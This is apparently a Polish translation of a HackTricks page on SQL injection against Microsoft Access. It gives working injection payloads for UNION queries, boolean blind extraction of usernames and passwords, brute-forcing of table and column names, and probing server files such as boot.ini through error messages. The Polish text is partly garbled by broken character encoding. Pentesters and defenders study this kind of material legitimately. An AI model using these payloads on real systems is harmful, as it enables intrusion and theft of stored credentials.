# Wstrzykiwanie SQL w MS Access

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Online Playground

* [https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1](https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1)

## Ograniczenia bazy danych

### Konkatenacja cig贸w znak贸w

Konkatenacja cig贸w znak贸w jest mo偶liwa za pomoc znak贸w `& (%26)` i `+ (%2b)`.
```sql
1' UNION SELECT 'web' %2b 'app' FROM table%00
1' UNION SELECT 'web' %26 'app' FROM table%00
```
### Komentarze

W MS Access nie ma komentarzy, ale wydaje si, 偶e mo偶na usun ostatni cz zapytania za pomoc znaku NULL:
```sql
1' union select 1,2 from table%00
```
Jeli to nie dziaa, zawsze mo偶esz poprawi skadni zapytania:
```sql
1' UNION SELECT 1,2 FROM table WHERE ''='
```
### Zapytania zagnie偶d偶one

Nie s obsugiwane.

### LIMIT

Operator **`LIMIT`** **nie jest zaimplementowany**. Jednak偶e, mo偶liwe jest ograniczenie wynik贸w zapytania SELECT do **pierwszych N wierszy tabeli za pomoc operatora `TOP`**. `TOP` przyjmuje jako argument liczb cakowit, reprezentujc liczb zwracanych wierszy.
```sql
1' UNION SELECT TOP 3 attr FROM table%00
```
Tak jak w przypadku TOP, mo偶na u偶y **`LAST`**, kt贸ry pobierze **wiersze od koca**.

## Zapytania UNION/Podzapytania

W SQLi zazwyczaj chcesz w jaki spos贸b wykona nowe zapytanie, aby wydoby informacje z innych tabel. MS Access zawsze wymaga, aby w **podzapytaniach lub dodatkowych zapytaniach wskazano `FROM`**.\
Wic jeli chcesz wykona `UNION SELECT` lub `UNION ALL SELECT` lub `SELECT` w nawiasach w warunku, zawsze **musisz wskaza `FROM` z prawidow nazw tabeli**.\
Dlatego musisz zna **prawidow nazw tabeli**.
```sql
-1' UNION SELECT username,password from users%00
```
### czenie r贸wnoci + Podcig

{% hint style="warning" %}
To pozwoli Ci na wydobycie wartoci z bie偶cej tabeli bez koniecznoci znajomoci nazwy tabeli.
{% endhint %}

**MS Access** pozwala na **dziwn skadni**, tak jak **`'1'=2='3'='asd'=false`**. Jak zwykle, wstrzyknicie SQL bdzie znajdowa si w klauzuli **`WHERE`**, wic mo偶emy to wykorzysta.

Wyobra藕 sobie, 偶e masz SQLi w bazie danych MS Access i wiesz (lub zgadujesz), 偶e jedna z **nazw kolumn to username**, a to pole chcesz **wydoby**. Mo偶esz sprawdzi r贸偶ne odpowiedzi aplikacji internetowej, gdy u偶ywana jest technika czenia r贸wnoci i potencjalnie wydoby zawarto za pomoc **wstrzyknicia booleanowego**, u偶ywajc funkcji **`Mid`** do pobierania podcig贸w.
```sql
'=(Mid(username,1,3)='adm')='
```
Jeli znasz **nazw tabeli** i **kolumny**, kt贸r chcesz wydoby, mo偶esz u偶y kombinacji funkcji `Mid`, `LAST` i `TOP`, aby **wyciec wszystkie informacje** za pomoc boolean SQLi:
```sql
'=(Mid((select last(useranme) from (select top 1 username from usernames)),1,3)='Alf')='
```
_Mo偶esz to sprawdzi w internetowym rodowisku testowym._

### Brute-forcing nazw tabel

Za pomoc techniki acuchowego r贸wnania mo偶esz r贸wnie偶 **brute-force'owa nazwy tabel** u偶ywajc czego takiego jak:
```sql
'=(select+top+1+'lala'+from+<table_name>)='
```
Mo偶esz r贸wnie偶 u偶y bardziej tradycyjnej metody:
```sql
-1' AND (SELECT TOP 1 <table_name>)%00
```
_Nie wahaj si sprawdzi tego w internetowym rodowisku testowym._

* Wsp贸lne nazwy tabel w Sqlmap: [https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt](https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt)
* Istnieje inna lista na stronie [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

### Pr贸ba siowa nazw kolumn

Mo偶esz **pr贸bowa siowo nazw bie偶cych kolumn** za pomoc sztuczki z acuchowaniem r贸wnoci z:
```sql
'=column_name='
```
Lub z u偶yciem **group by**:
```sql
-1' GROUP BY column_name%00
```
Lub mo偶esz przeprowadzi brutalne przeamanie nazw kolumn **innego tabeli** za pomoc:
```sql
'=(SELECT TOP 1 column_name FROM valid_table_name)='

-1' AND (SELECT TOP 1 column_name FROM valid_table_name)%00
```
### Wydobywanie danych

Ju偶 om贸wilimy [**technik czenia r贸wnoci**](ms-access-sql-injection.md#chaining-equals-+-substring) **do wydobywania danych z bie偶cych i innych tabel**. Ale istniej inne sposoby:
```sql
IIF((select mid(last(username),1,1) from (select top 10 username from users))='a',0,'ko')
```
W skr贸cie, zapytanie u偶ywa instrukcji "if-then", aby wywoa "200 OK" w przypadku sukcesu lub "500 Internal Error" w przeciwnym razie. Wykorzystujc operator TOP 10, mo偶na wybra pierwszych dziesi wynik贸w. Nastpne u偶ycie LAST pozwala uwzgldni tylko 10. krotk. Na tej wartoci, u偶ywajc operatora MID, mo偶na przeprowadzi prost por贸wnanie znak贸w. Poprawiajc indeks MID i TOP, mo偶emy wycign zawarto pola "username" dla wszystkich wierszy.

### Oparte na czasie

Sprawd藕 [https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676\(v=technet.10\)?redirectedfrom=MSDN)

### Inne interesujce funkcje

* `Mid('admin',1,1)` pobierz podcig od pozycji 1 o dugoci 1 (pocztkowa pozycja to 1)
* `LEN('1234')` pobierz dugo cigu znak贸w
* `ASC('A')` pobierz warto ASCII znaku
* `CHR(65)` pobierz cig znak贸w z wartoci ASCII
* `IIF(1=1,'a','b')` jeli to
* `COUNT(*)` Liczba element贸w

## Wyliczanie tabel

Z [**tutaj**](https://dataedo.com/kb/query/access/list-of-tables-in-the-database) mo偶esz zobaczy zapytanie, kt贸re pobiera nazwy tabel:
```sql
select MSysObjects.name
from MSysObjects
where
MSysObjects.type In (1,4,6)
and MSysObjects.name not like '~*'
and MSysObjects.name not like 'MSys*'
order by MSysObjects.name
```
Jednak偶e, nale偶y zauwa偶y, 偶e bardzo czsto mo偶na znale藕 Wstrzyknicia SQL, gdzie **nie masz dostpu do odczytu tabeli `MSysObjects`**.

## Dostp do systemu plik贸w

### Pena cie偶ka do katalogu g贸wnego witryny

Wiedza o **bezwzgldnej cie偶ce do katalogu g贸wnego witryny mo偶e uatwi dalsze ataki**. Jeli bdy aplikacji nie s cakowicie ukryte, cie偶ka katalogu mo偶e zosta ujawniona podczas pr贸by wyboru danych z nieistniejcej bazy danych.

`http://localhost/script.asp?id=1'+'+UNION+SELECT+1+FROM+FakeDB.FakeTable%00`

MS Access odpowiada **komunikatem o bdzie zawierajcym pen cie偶k katalogu witryny**.

### Wyliczanie plik贸w

Nastpujcy wektor ataku mo偶e by u偶ywany do **wnioskowania o istnieniu pliku na zdalnym systemie plik贸w**. Jeli okrelony plik istnieje, MS Access wywouje komunikat o bdzie informujcy, 偶e format bazy danych jest nieprawidowy:

`http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\boot.ini'%00`

Innym sposobem na wyliczenie plik贸w jest **okrelenie elementu bazy danych.tabela**. **Jeli** okrelony **plik istnieje**, MS Access wywietla **komunikat o bdzie formatu bazy danych**.

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\boot.ini.TableName%00`

### Odgadywanie nazwy pliku .mdb

**Nazwa pliku bazy danych (.mdb)** mo偶e by wywnioskowana za pomoc nastpujcego zapytania:

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].realTable%00`

Gdzie **name\[i] to nazwa pliku .mdb** i **realTable to istniejca tabela** w bazie danych. Chocia偶 MS Access zawsze wywoa komunikat o bdzie, mo偶liwe jest rozr贸偶nienie midzy nieprawidow nazw pliku a prawidow nazw pliku .mdb.

### amacz hasa .mdb

[**Access PassView**](https://www.nirsoft.net/utils/accesspv.html) to darmowe narzdzie, kt贸re mo偶na u偶y do odzyskania g贸wnego hasa bazy danych Microsoft Access 95/97/2000/XP lub Jet Database Engine 3.0/4.0.

## Odwoania

* [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
